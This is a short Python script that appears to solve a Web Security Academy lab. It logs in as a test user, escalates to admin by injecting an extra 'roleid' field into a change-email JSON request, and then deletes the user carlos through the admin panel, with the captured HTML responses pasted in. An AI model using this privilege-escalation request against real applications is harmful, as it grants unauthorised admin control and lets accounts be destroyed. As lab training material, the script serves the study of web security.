# Lab: User role can be modified in user profile

import requests

base = "https://0a0b005f041e8dc5830f147f00e2009e.web-security-academy.net"
s = requests.Session()

r = s.post(f"{base}/login", data={"username": "wiener", "password": "peter"})
print("login ok:", "Log out" in r.text)

r2 = s.post(
    f"{base}/my-account/change-email",
    json={"email": "wiener@normal-user.net", "roleid": 2},
)
print(r2.status_code)
print(r2.text)

r3=s.get(f"{base}/admin")
print(r3.text)
'''
                            <span>wiener - </span>
                            <a href="/admin/delete?username=wiener">Delete</a>
                        </div>
                        <div>
                            <span>carlos - </span>
                            <a href="/admin/delete?username=carlos">Delete</a>
'''
r4=s.get(f"{base}/admin/delete?username=carlos")
print(r4.text)
'''
                    <section>
                        <p>User deleted successfully!</p>
                        <h1>Users</h1>
                        <div>
                            <span>wiener - </span>
                            <a href="/admin/delete?username=wiener">Delete</a>
                        </div>
                    </section>
'''